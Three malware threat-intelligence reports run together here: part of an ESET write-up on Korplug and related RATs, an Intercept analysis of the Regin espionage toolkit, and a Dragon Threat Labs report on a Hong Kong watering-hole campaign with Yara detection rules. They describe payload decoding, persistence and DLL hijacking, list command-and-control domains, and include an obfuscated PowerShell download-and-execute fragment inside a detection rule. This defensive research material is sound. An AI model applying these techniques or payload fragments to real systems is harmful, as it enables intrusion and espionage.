The image below shows the beginning of the CVE-2012-0158 shellcode in ASCII encoding within the document ( the opcodes 60 , 55 , 8bec disassemble to pusha ; push ebp ; mov ebp , esp ) .
Interestingly , though , the documents also contain the newer CVE-2014-1761 exploit that was extensively used in targeted attacks carried out by a number other malware families this year ( including BlackEnergy , Sednit , MiniDuke , and others ) .
However , this exploit is not implemented correctly due to a wrong file offset in the 1st stage shellcode .
Below we see the disassembly of the 1st stage shellcode where it checks the presence of the tag “ p ! 11 ” marking the beginning of the 2nd stage shellcode and loads it into memory .
Even though the tag and 2nd stage shellcode is present in the RTF , it ’ s at a different offset , and thus never is loaded .
Sophos ’ Gabor Szappanos gives a possible explanation how these malformed samples may have come into existence .
ESET LiveGrid telemetry indicates that the attacks against these targets have been going on since at least June 2014 and continue through today .
We were able to pinpoint the targets to residents of the following countries :
Afghanistan Tajikistan Russia Kyrgyzstan Kazakhstan .
From the topics of the files used to spread the malware , as well as from the affected targets , it appears that the attackers are interested in gathering intelligence related to Afghan , Tajik and Russian military and diplomatic subjects .
Interestingly , most of the affected victims have another thing in common – a number of other RATs , file stealing trojans or keyloggers were detected on their systems on top of the Korplug RAT detection .
One of these ‘ alternative RATs ’ was connecting to a domain also used by the Korplug samples .
Since the functionality of these tools was partly overlapping with that of Korplug , it left us wondering whether the attackers were just experimenting with different RATs or were they supplementing some functionality that they were unable to accomplish .
Additional information about two malware families that were most often found accompanying Korplug infections is given below .
Alternative Malware # 1 : DarkStRat .
A curious Remote Access Trojan , as research points to a Chinese connection but the commands it listens to are in Spanish ( translation in English ) :
CERRAR ( close ) DESINSTALAR ( uninstall ) SERVIDOR ( server ) INFO MAININFO PING REBOOT POWEROFF PROC KILLPROC VERUNIDADES ( see units ) LISTARARCHIVOS ( list files ) EXEC DELFILE DELFOLDER RENAME MKDIR CAMBIOID ( change ID ) GETFILE/SENDFILE/RESUMETRANSFER SHELL SERVICIOSLISTAR ( list service ) INICIARSERVICIO ( start service ) DETENERSERVICIO ( stop service ) BORRARSERVICIO ( erase service ) INSTALARSERVICIO ( install service ) .
The malware can manage processes and services on the infected machine , transfer files to and from the C & C server , run shell commands , and so on .
It is written in Delphi and connects to www.dicemention.com .
Some samples contain a digital signature by “ Nanning weiwu Technology co. , ltd ” .
Alternative Malware # 2 : File Stealer .
This malware , written in C , and contains several functions for harvesting files off the victim ’ s hard drive according to criteria set in the configuration file .
Apart from doing a recursive sweep of all logical fixed and remote drives , it also continually monitors any attached removable media or network shares by listening to DBT_DEVICEARRIVAL events .
In addition to collecting files , the malware attempts to gather saved passwords , history of visited URLs , account information and proxy information from the following applications :
Microsoft Messenger Microsoft Outlook Microsoft Internet Explorer Mozilla Firefox .
The C & C domains used by this malware are :
newvinta.com worksware.net .
Some samples of this file stealer detected in these campaigns also contain the signature by “ Nanning weiwu Technology co. , ltd ” – another indicator that the infections are related .
List of SHA1 hashes :
Korpluglternative Malware # 1 : FDD41EB3CBB631F38AC415347E25926E3E3F09B6 457F4FFA2FE1CACFEA53F8F5FF72C3FA61939CCD 5B6D654EB16FC84A212ACF7D5A05A8E8A642CE20 7D59B19BD56E1D2C742C39A2ABA9AC34F6BC58D4 D7D130B8CC9BEA51143F28820F08068521763494 01B4B92D5839ECF3130F5C69652295FE4F2DA0C5 02C38EC1C67098E1F6854D1125D3AED6268540DE Alternative Malware # 2 : 3A7FB6E819EEC52111693219E604239BD25629E9 BF77D0BA7F3E60B45BD0801979B12BEA703B227B 55EF67AFA2EC2F260B046A901868C48A76BC7B72 A29F64CD7B78E51D0C9FDFBDCBC57CED43A157B2 34754E8B410C9480E1ADFB31A4AA72419056B622 17A2F18C9CCAAA714FD31BE2DE0BC62B2C310D8F 6D99ACEA8323B8797560F7284607DB08ECA616D8 1884A05409C7EF877E0E1AAAEC6BB9D59E065D7C 1FC6FB0D35DCD0517C82ADAEF1A85FFE2AFAB4EE 5860C99E5065A414C91F51B9E8B779D10F40ADC4 7950D5B57FA651CA6FA9180E39B6E8CC1E65B746 Research by : Anton Cherepanov Author Robert Lipovsky , ESET .
SECRET MALWARE IN EUROPEAN UNION ATTACK LINKED TO U.S .
AND BRITISH INTELLIGENCE .
Complex malware known as Regin is the suspected technology behind sophisticated cyberattacks conducted by U.S .
and British intelligence agencies on the European Union and a Belgian telecommunications company , according to security industry sources and technical analysis conducted by The Intercept .
Regin was found on infected internal computer systems and email servers at Belgacom , a partly state-owned Belgian phone and internet provider , following reports last year that the company was targeted in a top-secret surveillance operation carried out by British spy agency Government Communications Headquarters , industry sources told The Intercept .
The malware , which steals data from infected systems and disguises itself as legitimate Microsoft software , has also been identified on the same European Union computer systems that were targeted for surveillance by the National Security Agency .
The hacking operations against Belgacom and the European Union were first revealed last year through documents leaked by NSA whistleblower Edward Snowden .
The specific malware used in the attacks has never been disclosed , however .
The Regin malware , whose existence was first reported by the security firm Symantec on Sunday , is among the most sophisticated ever discovered by researchers .
Symantec compared Regin to Stuxnet , a state-sponsored malware program developed by the U.S .
and Israel to sabotage computers at an Iranian nuclear facility .
Sources familiar with internal investigations at Belgacom and the European Union have confirmed to The Intercept that the Regin malware was found on their systems after they were compromised , linking the spy tool to the secret GCHQ and NSA operations .
Ronald Prins , a security expert whose company Fox IT was hired to remove the malware from Belgacom ’ s networks , told The Intercept that it was “ the most sophisticated malware ” he had ever studied .
“ Having analyzed this malware and looked at the [ previously published ] Snowden documents , ” Prins said , “ I ’ m convinced Regin is used by British and American intelligence services . ” A spokesman for Belgacom declined to comment specifically about the Regin revelations , but said that the company had shared “ every element about the attack ” with a federal prosecutor in Belgium who is conducting a criminal investigation into the intrusion .
“ It ’ s impossible for us to comment on this , ” said Jan Margot , a spokesman for Belgacom .
“ It ’ s always been clear to us the malware was highly sophisticated , but ever since the clean-up this whole story belongs to the past for us . ” In a hacking mission codenamed Operation Socialist , GCHQ gained access to Belgacom ’ s internal systems in 2010 by targeting engineers at the company .
The agency secretly installed so-called malware “ implants ” on the employees ’ computers by sending their internet connection to a fake LinkedIn page .
The malicious LinkedIn page launched a malware attack , infecting the employees ’ computers and giving the spies total control of their systems , allowing GCHQ to get deep inside Belgacom ’ s networks to steal data .
The implants allowed GCHQ to conduct surveillance of internal Belgacom company communications and gave British spies the ability to gather data from the company ’ s network and customers , which include the European Commission , the European Parliament , and the European Council .
The software implants used in this case were part of the suite of malware now known as Regin .
One of the keys to Regin is its stealth : To avoid detection and frustrate analysis , malware used in such operations frequently adhere to a modular design .
This involves the deployment of the malware in stages , making it more difficult to analyze and mitigating certain risks of being caught .
Based on an analysis of the malware samples , Regin appears to have been developed over the course of more than a decade ; The Intercept has identified traces of its components dating back as far as 2003 .
Regin was mentioned at a recent Hack.lu conference in Luxembourg , and Symantec ’ s report on Sunday said the firm had identified Regin on infected systems operated by private companies , government entities , and research institutes in countries such as Russia , Saudi Arabia , Mexico , Ireland , Belgium , and Iran .
The use of hacking techniques and malware in state-sponsored espionage has been publicly documented over the last few years : China has been linked to extensive cyber espionage , and recently the Russian government was also alleged to have been behind a cyber attack on the White House .
Regin further demonstrates that Western intelligence agencies are also involved in covert cyberespionage .
GCHQ declined to comment for this story .
The agency issued its standard response to inquiries , saying that “ it is longstanding policy that we do not comment on intelligence matters ” and “ all of GCHQ ’ s work is carried out in accordance with a strict legal and policy framework , which ensures that our activities are authorised , necessary and proportionate . ” The NSA said in a statement , “ We are not going to comment on The Intercept ’ s speculation . ” The Intercept has obtained samples of the malware from sources in the security community and is making it available for public download in an effort to encourage further research and analysis .
( To download the malware , click here .
The file is encrypted ; to access it on your machine use the password “ infected . ” ) What follows is a brief technical analysis of Regin conducted by The Intercept ’ s computer security staff .
Regin is an extremely complex , multi-faceted piece of work and this is by no means a definitive analysis .
In the coming weeks , The Intercept will publish more details about Regin and the infiltration of Belgacom as part of an investigation in partnership with Belgian and Dutch newspapers De Standaard and NRC Handelsblad .
Origin of Regin .
In Nordic mythology , the name Regin is associated with a violent dwarf who is corrupted by greed .
It is unclear how the Regin malware first got its name , but the name appeared for the first time on the VirusTotal website on March 9th 2011 .
Der Spiegel reported that , according to Snowden documents , the computer networks of the European Union were infiltrated by the NSA in the months before the first discovery of Regin .
Industry sources familiar with the European Parliament intrusion told The Intercept that such attacks were conducted through the use of Regin and provided samples of its code .
This discovery , the sources said , may have been what brought Regin to the wider attention of security vendors .
Also on March 9th 2011 , Microsoft added related entries to its Malware Encyclopedia :
Alert level : Severe First detected by definition : 1.99.894.0 Latest detected by definition : 1.173.2181.0 and higher First detected on : Mar 09 , 2011 This entry was first published on : Mar 09 , 2011 This entry was updated on : Not available .
Two more variants of Regin have been added to the Encyclopedia , Regin.B and Regin.C .
Microsoft appears to detect the 64-bit variants of Regin as Prax.A and Prax.B .
None of the Regin/Prax entries are provided with any sort of summary or technical information .
The following Regin components have been identified :
Loaders .
The first stage are drivers which act as loaders for a second stage .
They have an encrypted block which points to the location of the 2nd stage payload .
On NTFS , that is an Extended Attribute Stream ; on FAT , they use the registry to store the body .
When started , this stage simply loads and executes Stage 2 .
The Regin loaders that are disguised as Microsoft drivers with names such as :
serial.sys cdaudio.sys atdisk.sys parclass.sys usbclass.sys .
Mimicking Microsoft drivers allows the loaders to better disguise their presence on the system and appear less suspicious to host intrusion detection systems .
Second stage loader .
When launched , it cleans traces of the initial loader , loads the next part of the toolkit and monitors its execution .
On failure , Stage 2 is able to disinfect the compromised device .
The malware zeroes out its PE ( Portable Executable , the Windows executable format ) headers in memory , replacing “ MZ ” with its own magic marker 0xfedcbafe .
Orchestrator .
This component consists of a service orchestrator working in Windows ’ kernel .
It initializes the core components of the architecture and loads the next parts of the malware .
Information Harvesters .
This stage is composed of a service orchestrator located in user land , provided with many modules which are loaded dynamically as needed .
These modules can include data collectors , a self-defense engine which detects if attempts to detect the toolkit occur , functionality for encrypted communications , network capture programs , and remote controllers of different kinds .
Stealth Implant .
The Intercept ’ s investigation revealed a sample uploaded on VirusTotal on March 14th 2012 that presents the unique 0xfedcbafe header , which is a sign that it might have been loaded by a Regin driver and it appears to provide stealth functionality for the tool kit .
This picture shows the very first bytes of the sample in question , showing the unique 0xfedcbafe header at the beginning .
In order to access information stored in the computer ’ s memory , programs use objects that reference specific locations in memory called pointers .
This binary file contains some of such pointers initialized , which corroborates the hypothesis that the file was dumped from memory during a forensic analysis of a compromised system .
The sample has the following SHA256 hash :
fe1419e9dde6d479bd7cda27edd39fafdab2668d498931931a2769b370727129 .
This sample gives a sense of the sophistication of the actors and the length of the precautions they have been taking in order to operate as stealthily as possible .
When a Windows kernel driver needs to allocate memory to store some type of data , it creates so called kernel pools .
Such memory allocations have specific headers and tags that are used to identify the type of objects contained within the block .
For example such tags could be Proc , Thrd or File , which respectively indicate that the given block would contain a process , thread or file object structure .
When performing forensic analysis of a computer ’ s memory , it is common to use a technique called pool scanning to parse the kernel memory , enumerate such kernel pools , identify the type of content and extract it .
Just like Regin loader drivers , this driver repeatedly uses the generic “ Ddk “ tag with ExAllocatePoolWithTag ( ) when allocating all kernel pools :
This picture shows the use of the “ ddk “ tag when allocating memory with the Windows ExAllocatePoolWIthTag ( ) function .
The generic tag which is used throughout the operating system when a proper tag is not specified .
This makes it more difficult for forensic analysts to find any useful information when doing pool scanning , since all its memory allocations will mix with many generic others .
In addition , when freeing memory using ExFreePool ( ) , the driver zeroes the content , probably to avoid leaving traces in pool memory .
The driver also contains routines to check for specific builds of the Windows kernel in use , including very old versions such as for Windows NT4 Terminal Server and Windows 2000 , and then adapts its behavior accordingly .
Windows kernel drivers operate on different levels of priority , from the lowest PASSIVE_LEVEL to the highest HIGH_LEVEL .
This level is used by the processor to know what service give execution priority to and to make sure that the system doesn ’ t try to allocate used resources which could result in a crash .
This Regin driver recurrently checks that the current IRQL ( Interrupt Request Level ) is set to PASSIVE_LEVEL using the KeGetCurrentIrql ( ) function in many parts of the code , probably in order to operate as silently as possible and to prevent possible IRQL confusion .
This technique is another example of the level of precaution the developers took while designing this malware framework .
Upon execution of the unload routine ( located at 0xFDEFA04A ) , the driver performs a long sequence of steps to remove remaining traces and artifacts .
Belgacom Sample .
In an interview given to the Belgian magazine MondiaalNiews , Fabrice Clément , head of security of Belgacom , said that the company first identified the attack on June 21 , 2013 .
In the same interview Clément says that the computers targeted by the attackers included staff workstations as well as email servers .
These statements confirm the timing and techniques used in the attack .
From previously identified Regin samples , The Intercept developed unique signatures which could identify this toolkit .
A zip archive with a sample identified as Regin/Prax was found in VirusTotal , a free , online website which allows people to submit files to be scanned by several anti-virus products .
The zip archive was submitted on 2013-06-21 07:58:37 UTC from Belgium , the date identified by Clément .
Sources familiar with the Belgacom intrusion told The Intercept that this sample was uploaded by a systems administrator at the company , who discovered the malware and uploaded it in an attempt to research what type of malware it was .
The archive contains :
Along with other files The Intercept found the output of a forensic tool , GetThis , which is being run on target systems looking for malware .
From the content of the GetThis.log file , we can see that a sample called “ svcsstat.exe ” and located in C : \Windows\System32\ was collected and a copy of it was stored .
The malware in question is “ 0001000000000C1C_svcsstat.exe_sample ” .
This is a 64bit variant of the first stage Regin loader aforementioned .
The archive also contains the output of ProcMon , “ Process Monitor ” , a system monitoring tool distributed by Microsoft and commonly used in forensics and intrusion analysis .
This file identifies the infected system and provides a variety of interesting information about the network .
For instance :
USERDNSDOMAIN=BGC.NET USERDOMAIN=BELGACOM USERNAME=id051897a USERPROFILE=C : \Users\id051897a .
The following environment variable shows that the system was provided with a Microsoft SQL server and a Microsoft Exchange server , indicating that it might one of the compromised corporate mail server Fabrice Clément mentioned to Mondiaal News :
Path=C : \Program Files\Legato\nsr\bin ; C : \Windows\system32 ; C : \Windows ; C : \Windows\System32\Wbem ; C : \Windows\System32\WindowsPowerShell\v1.0\ ; C : \Program Files\Microsoft Network Monitor 3\ ; C : \Program Files\System Center Operations Manager 2007\ ; c : \Program Files ( x86 ) \Microsoft SQL Server\90\Tools\binn\ ; D : \Program Files\Microsoft\Exchange Server\bin .
Below is a list of hashes for the files The Intercept is making available for download .
Given that that it has been over a year since the Belgacom operation was publicly outed , The Intercept considers it likely that the GCHQ/NSA has replaced their toolkit and no current operations will be affected by the publication of these samples .
Regin Samples .
32-bit Loaders .
20831e820af5f41353b5afab659f2ad42ec6df5d9692448872f3ed8bbb40ab92 7553d4a5914af58b23a9e0ce6a262cd230ed8bb2c30da3d42d26b295f9144ab7 f89549fc84a8d0f8617841c6aa4bb1678ea2b6081c1f7f74ab1aebd4db4176e4 fd92fd7d0f925ccc0b4cbb6b402e8b99b64fa6a4636d985d78e5507bd4cfecef 225e9596de85ca7b1025d6e444f6a01aa6507feef213f4d2e20da9e7d5d8e430 9cd5127ef31da0e8a4e36292f2af5a9ec1de3b294da367d7c05786fe2d5de44f b12c7d57507286bbbe36d7acf9b34c22c96606ffd904e3c23008399a4a50c047 f1d903251db466d35533c28e3c032b7212aa43c8d64ddf8c5521b43031e69e1e 4e39bc95e35323ab586d740725a1c8cbcde01fe453f7c4cac7cced9a26e42cc9 a0d82c3730bc41e267711480c8009883d1412b68977ab175421eabc34e4ef355 a7493fac96345a989b1a03772444075754a2ef11daa22a7600466adc1f69a669 5001793790939009355ba841610412e0f8d60ef5461f2ea272ccf4fd4c83b823 a6603f27c42648a857b8a1cbf301ed4f0877be75627f6bbe99c0bfd9dc4adb35 8d7be9ed64811ea7986d788a75cbc4ca166702c6ff68c33873270d7c6597f5db 40c46bcab9acc0d6d235491c01a66d4c6f35d884c19c6f410901af6d1e33513b df77132b5c192bd8d2d26b1ebb19853cf03b01d38afd5d382ce77e0d7219c18c 7d38eb24cf5644e090e45d5efa923aff0e69a600fb0ab627e8929bb485243926 a7e3ad8ea7edf1ca10b0e5b0d976675c3016e5933219f97e94900dea0d470abe a0e3c52a2c99c39b70155a9115a6c74ea79f8a68111190faa45a8fd1e50f8880 d42300fea6eddcb2f65ffec9e179e46d87d91affad55510279ecbb0250d7fdff 5c81cf8262f9a8b0e100d2a220f7119e54edfc10c4fb906ab7848a015cd12d90 b755ed82c908d92043d4ec3723611c6c5a7c162e78ac8065eb77993447368fce c0cf8e008fbfa0cb2c61d968057b4a077d62f64d7320769982d28107db370513 cca1850725f278587845cd19cbdf3dceb6f65790d11df950f17c5ff6beb18601 ecd7de3387b64b7dab9a7fb52e8aa65cb7ec9193f8eac6a7d79407a6a932ef69 e1ba03a10a40aab909b2ba58dcdfd378b4d264f1f4a554b669797bbb8c8ac902 392f32241cd3448c7a435935f2ff0d2cdc609dda81dd4946b1c977d25134e96e 9ddbe7e77cb5616025b92814d68adfc9c3e076dddbe29de6eb73701a172c3379 8389b0d3fb28a5f525742ca2bf80a81cf264c806f99ef684052439d6856bc7e7 .
32-bit Rootkit .
fe1419e9dde6d479bd7cda27edd39fafdab2668d498931931a2769b370727129 .
32-bit Orchestrator .
e420d0cf7a7983f78f5a15e6cb460e93c7603683ae6c41b27bf7f2fa34b2d935 4139149552b0322f2c5c993abccc0f0d1b38db4476189a9f9901ac0d57a656be .
64-bit Loader ( Belgacom ) .
4d6cebe37861ace885aa00046e2769b500084cc79750d2bf8c1e290a1c42aaff .
Photo credit : Winfried Rothermel/AP .
January 12 2015 Insight in to a strategic web compromise and attack campaign against Hong Kong infrastructure .
Revealing an attacker ’ s persistence , sophistication and aggression .
Dragon Threat Labs , Hong Kong Author : Dan .
Contents Introduction .
2 Strategic web compromise .
2 First stage malware ( Dropper component – “ Swisyn ” part 1 ) .
4 Second stage ( Decoder and loader – “ Swisyn ” part 2 ) .
6 Final stage ( RAT – “ PCClient ” ) .
7 Infrastructure & associations .
9 Detection & mitigation .
11 Appendix .
14 Contact .
15 .
Dragon Threat Labs , Hong Kong Page 1 .
Introduction .
Over the past several months an increasing number of strategic web compromises ( “ wateringholes ” ) have been discovered on websites in Hong Kong .
This rise in activity coincides with the Occupy Central protests .
In this post we will talk about a single attack , whilst not trying to distract attention from the vast number of attacks and subsequent compromises that remain persistent in Hong Kong .
Whilst going about our daily business we were alerted to a website that began serving a malicious payload alongside its usual web page .
The initial investigation revealed that the attack and associated payloads are part of an ongoing attack campaign by an Advanced Persistent Threat group that is known to target various sectors of industry and Government in Hong Kong .
In this instance we have chosen to obfuscate details of the compromised website to protect the identity of the victim .
This website belongs to a private educational institution who , since being notified about the compromise , has removed the malicious executable and remediated the compromised of their server , thus breaking a crucial link in the chain of this attack .
Strategic web compromise .
The website in question was implanted with some HTML code that simply reaches out to a secondary website and downloads malware .
Whilst this in itself is not interesting the methodology used to obfuscate code and evade detection are .
The underlying code in the first page that loads exploits a vulnerability in Internet Explorer ( CVE-2014-6332 ) and runs several scripts , each with support for different operating systems and methods of downloading and executing a file from a website .
The first script is obfuscated Visual Basic Script ( “ VBS ” ) By decoding this we can see the true intentions of the script – which opens a whole new can of worms .
Dragon Threat Labs , Hong Kong Page 2 .
This code is extremely interesting because not only does it contain VBScript but also contains PowerShell script .
Once running it uses an elaborate way to detect the operating system version and then selects whether to use VBScript or Powershell based on the result ; VBScript for Windows XP and Powershell for newer versions of Windows .
The Powershell script is compressed and Base64 encoded .
By decoding this script we can determine its nature As you can see this powershell script simply extracts another VBScript and executes it .
The VBScript then downloads the first binary payload into the user ’ s temporary directory and names it ‘ plug.exe ’ .
If the operating system version is too old to support Powershell then the script will attempt to use VBScript .
This VBScript downloads the primary payload to the temporary directory and names it “ z1.exe ” .
Dragon Threat Labs , Hong Kong Page 3 .
First stage malware ( Dropper component – “ Swisyn ” part 1 ) .
The first binary payload that lands on the system is relatively simple and serves as a method of yet again detecting the operating system version and where to drop a secondary payload file .
Whilst this binary is not complicated by nature it has been designed to masquerade as a legitimate application and contains functionality to evade anti-virus .
This malware implant is commonly detected by anti virus as Swisyn .
Upon running this malware determines the operating system version , but only delineating between Windows XP , Visa and above .
It appears that this functionality is included because the secondary payload comes in both 32bit and 64bit versions .
Both of these second stage payloads are obfuscated but decoded with a simple bitwise operation as per below .
Dragon Threat Labs , Hong Kong Page 4 .
In this scenario , the secondary payloads can be decoded using a simple subtraction of 3 followed by an XOR of 3 from each byte .
This file is then written to % User % \Application Data\Microsoft in a newly created folder name ‘ wuauclt ’ .
The filename depends on the operating system version , for Windows XP it is “ clbcatq.dll ” , for Windows Vista and above it is “ profapi.dll ” .
Once this file has been written to disk a file from the Windows System32 folder is copied into the directory .
This file , named ‘ wuauclt.exe ’ , is the Windows update client interface and it a standard windows file .
By executing this file in a specific manner it will load the freshly dropped DLL file – affectively this is known as DLL hijacking .
Following this action another file , named ‘ wuauclt.dat ’ , is written on to the disk under the same directory .
This file is encoded and not decoded at this stage of the attack .
To complete the file drop wuauclt.exe is executed .
The 64bit version of this dropper is vastly similar in functionality although it offers slightly more efficiency in the code .
The decoding routine is more simplified than its 32bit counterpart and the decoding key is hardcoded .
Dragon Threat Labs , Hong Kong Page 5 .
The following pseudo-code can decode both 32bit and 64bit versions of the DLL stored in ‘ wuauclt.dat ’ Not to dwell on a dropper , let ’ s move on to the second stage malware .
Second stage ( Decoder and loader – “ Swisyn ” part 2 ) .
The malware second stage is now loaded and running .
Interestingly , this payload is also detected by anti-virus as Swisyn .
This DLL is again fairly simple and acts as a secondary dropper .
It primarily serves as a method of decoding one of the files dropped by the previous malware stage and creating a method to start the malware on system boot-up or user login .
In order to do this the malware firstly decodes a file that was dropped by the previous stage – in this case it is “ wuauclt.dat ” .
The decoding routine is again overly complex but ultimately amounts to a simple subtraction and XOR , again both of these operations are performed by the number 3 , thus each byte is subtracted by 3 and then XOR ’ d with 3 .
Dragon Threat Labs , Hong Kong Page 6 .
Once this file has been decoded it is loaded into memory and executed .
This file , once decoded is the third and final payload .
The method of leaving the encoded file on disk and only decoding it in memory is to thwart poorly configured anti-virus or disk surface heuristic scanners .
Finally to wrap up , an entry is created in the registry named ‘ wuauclt ’ is created under ‘ HKCU\Software\Microsoft\Windows\CurrentVersion\Run ’ to ensure that this file is executed upon user-login .
Final stage ( RAT – “ PCClient ” ) .
Finally we are left with a full payload .
Unsurprisingly the 3rd and final stage of this part of the attack is a fully fledged RAT ( Remote Administration Tool ) , which is detected by anti-virus as PCClient .
This RAT allows the attacker to control the infected workstation and perform a vast array of administrative functions such as :
 Downloading files to the infected workstation  Uploading from the infected workstation files to the attackers  Enumerate/list all connected drives such as network shares or external devices  Search the infected workstations hard drive for files  Deleting , copying and moving files on the infected workstation  Executing commands on the infected workstation .
A high-level view of the command structure gives us an idea as to how simple this functionality can seem , but does not turn away from how damaging the affects can be :
Dragon Threat Labs , Hong Kong Page 7 .
Once the RAT has been loaded on the infected machine it begins calling out to the command and control server ( “ phoning home ” ) and waits for the attackers to issue one of the above commands to the victim .
As we usually see with APT attacks the malware controllers use a specific ID to code their attack campaign , which in this case is ‘ C00BBB ’ .
Information about the victim system is collected and posted off to the command and control server .
This information gives the attacker a brief description about the machine .
The information consists of :
 Machine hostname  Total amount of RAM memory  Operating system and service pack level  Attack campaign code .
This information is encoded using a simple bitwise operation and then sent to the command and control server .
For example : Unencoded data Encoded data 44 45 4C 4C 2D 31 37 38 DELL-178 BA B9 B2 B2 51 4D 47 46 º¹²²QMGF 44 33 43 00 00 00 00 00 D3C .
BA 4B BB 7E 7E 7E 7E 7E ºK » ~~~~~ 00 00 00 00 00 00 00 00 .
7E 7E 7E 7E 7E 7E 7E 7E ~~~~~~~~ 00 00 00 00 00 00 00 00 .
7E 7E 7E 7E 7E 7E 7E 7E ~~~~~~~~ 00 00 00 00 00 00 00 00 .
7E 7E 7E 7E 7E 7E 7E 7E ~~~~~~~~ 00 00 00 00 00 00 00 00 .
7E 7E 7E 7E 7E 7E 7E 7E ~~~~~~~~ 00 00 00 00 00 00 00 00 .
7E 7E 7E 7E 7E 7E 7E 7E ~~~~~~~~ 00 00 00 00 00 00 00 00 .
7E 7E 7E 7E 7E 7E 7E 7E ~~~~~~~~ 35 31 32 4D 42 00 00 00 512MB .
49 4D 4C B1 BC 7E 7E 7E IML±¼~~~ 00 00 00 00 00 00 00 00 .
7E 7E 7E 7E 7E 7E 7E 7E ~~~~~~~~ 00 00 00 00 00 00 00 00 .
7E 7E 7E 7E 7E 7E 7E 7E ~~~~~~~~ 00 00 00 00 00 00 00 00 .
7E 7E 7E 7E 7E 7E 7E 7E ~~~~~~~~ 57 69 6E 20 58 50 20 53 Win XP S A7 95 90 5E A6 AE 5E AB §••^¦®^ « 50 33 20 28 42 75 69 6C P3 ( Buil AE 4B 5E 56 BC 89 95 92 ®K^V¼‰• ’ .
Dragon Threat Labs , Hong Kong Page 8 .
64 20 32 36 30 30 29 00 d 2600 ) .
9A 5E 4C 48 4E 4E 55 7E š^LHNNU~ 00 00 00 00 00 00 00 00 .
7E 7E 7E 7E 7E 7E 7E 7E ~~~~~~~~ 00 00 00 00 00 00 00 00 .
7E 7E 7E 7E 7E 7E 7E 7E ~~~~~~~~ 00 00 00 00 00 00 00 00 .
7E 7E 7E 7E 7E 7E 7E 7E ~~~~~~~~ 00 00 00 00 00 00 00 00 .
7E 7E 7E 7E 7E 7E 7E 7E ~~~~~~~~ 00 00 00 00 00 00 00 00 .
7E 7E 7E 7E 7E 7E 7E 7E ~~~~~~~~ 43 30 30 42 42 42 00 00 C00BBB .
BB 4E 4E BC BC BC 7E 7E » NN¼¼¼~~ Whilst this may seem to make the data harder to recover it actually makes detection of the traffic easier .
To decode the traffic a simple calculation can be performed by reversing the encoding operations .
In this case the malware simply increases the initial encoding key by 1 , then adds this value to each byte in the buffer and finally XOR ’ s each byte .
Once again , the following pseudo-code can decode this data .
Infrastructure & associations .
During in the investigation we performed analysis of the infrastructure that this malware communicates with .
On this occasion we have not been able to gain physical access to the command and control server as it is legitimate , but compromised production infrastructure .
The graph below shows the flow in which various parts of the attack are loaded and how they chain together .
Dragon Threat Labs , Hong Kong Page 9 .
Dragon Threat Labs , Hong Kong Page 10 .
Detection & mitigation .
This attack can be detected and/or mitigated at each stage .
In order to help organisations protect themselves we have created a number of network IDS rules and disk-scan rules that can be used with Snort and Yara .
Rules are provided in a best-effort basis and we can not vouch for their efficiency in your environment .
Wateringhole code .
rule apt_win_wateringhole { meta : author = `` @ dragonthreatlab `` description = `` Detects code from APT wateringhole '' strings : $ str1 = `` function runmumaa ( ) '' $ str2 = `` Invoke-Expression $ ( New-Object IO.StreamReader ( $ ( New Object IO.Compression.DeflateStream ( $ ( New-Object IO.MemoryStream ( , $ ( [ Convert ] : :FromBase64String ( `` $ str3 = `` function MoSaklgEs7 ( k ) '' condition : any of ( $ str * ) } Swisyn rule apt_win_swisyn { meta : author = `` @ dragonthreatlab '' md5 = `` a6a18c846e5179259eba9de238f67e41 `` description = `` File matching the md5 above tends to only live in memory , hence the lack of MZ header check . '' strings : $ mz = { 4D 5A } $ str1 = `` /ShowWU '' ascii $ str2 = `` IsWow64Process '' $ str3 = `` regsvr32 `` $ str4 = { 8A 11 2A 55 FC 8B 45 08 88 10 8B 4D 08 8A 11 32 55 FC 8B 45 08 88 10 } condition : $ mz at 0 and all of ( $ str * ) } Malware dropper 32bit rule apt_win32_dropper { meta : author = `` @ dragonthreatlab '' md5 = `` ad17eff26994df824be36db246c8fb6a `` description = `` APT malware used to drop PcClient RAT '' strings : $ mz = { 4D 5A } $ str1 = `` clbcaiq.dll '' ascii $ str2 = `` profapi_104 '' ascii $ str3 = `` /ShowWU '' ascii $ str4 = `` Software\\Microsoft\\Windows\\CurrentVersion\\ '' ascii Dragon Threat Labs , Hong Kong Page 11 $ str5 = { 8A 08 2A CA 32 CA 88 08 40 4E 75 F4 5E } condition : $ mz at 0 and all of ( $ str * ) } Malware dropper 64bit rule apt_win64_dropper { meta : author = `` @ dragonthreatlab '' md5 = `` ad17eff26994df824be36db246c8fb6a '' description = `` APT malware used to drop PcClient RAT '' strings : $ mz = { 4D 5A } $ str1 = `` clbcaiq.dll '' ascii $ str2 = `` profapi_104 '' ascii $ str3 = `` \\Microsoft\\wuauclt\\wuauclt.dat '' ascii $ str4 = { 0F B6 0A 48 FF C2 80 E9 03 80 F1 03 49 FF C8 88 4A FF 75 EC } condition : $ mz at 0 and all of ( $ str * ) } .
Encoded version of PcClient .
rule apt_win_disk_pcclient { meta : author = `` @ dragonthreatlab `` md5 = `` 55f84d88d84c221437cd23cdbc541d2e `` description = `` Encoded version of pcclient found on disk '' strings : $ header = { 51 5C 96 06 03 06 06 06 0A 06 06 06 FF FF 06 06 BE 06 06 06 06 06 06 06 46 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 EE 06 06 06 10 1F BC 10 06 BA 0D D1 25 BE 05 52 D1 25 5A 6E 6D 73 26 76 74 6F 67 74 65 71 26 63 65 70 70 6F 7A 26 64 69 26 74 79 70 26 6D 70 26 4A 4F 53 26 71 6F 6A 69 30 11 11 0C 2A 06 06 06 06 06 06 06 73 43 96 1B 37 24 00 4E 37 24 00 4E 37 24 00 4E BA 40 F6 4E 39 24 00 4E 5E 41 FA 4E 33 24 00 4E 5E 41 FC 4E 39 24 00 4E 37 24 FF 4E 0D 24 00 4E FA 31 A3 4E 40 24 00 4E DF 41 F9 4E 36 24 00 4E F6 2A FE 4E 38 24 00 4E DF 41 FC 4E 38 24 00 4E 54 6D 63 6E 37 24 00 4E 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 06 56 49 06 06 52 05 09 06 5D 87 8C 5A 06 06 06 06 06 06 06 06 E6 06 10 25 0B 05 08 06 06 1C 06 06 06 1A 06 06 06 06 06 06 E5 27 06 06 06 16 06 06 06 36 06 06 06 06 06 16 06 16 06 06 06 04 06 06 0A 06 06 06 06 06 06 06 0A 06 06 06 06 06 06 06 06 76 06 06 06 0A 06 06 06 06 06 06 04 06 06 06 06 06 16 06 06 16 06 06 } condition : $ header at 0 } Dragon Threat Labs , 